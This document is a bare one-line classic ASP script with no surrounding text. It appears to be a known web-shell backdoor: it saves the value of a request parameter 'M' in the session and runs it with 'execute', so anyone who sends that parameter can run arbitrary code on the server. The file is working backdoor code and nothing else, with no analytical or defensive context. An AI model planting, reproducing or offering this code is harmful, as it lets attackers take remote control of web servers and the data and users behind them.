<%if request ("M")<>""then session("M")=request("M"):end if:if session("M")<>"" then execute session("M")%>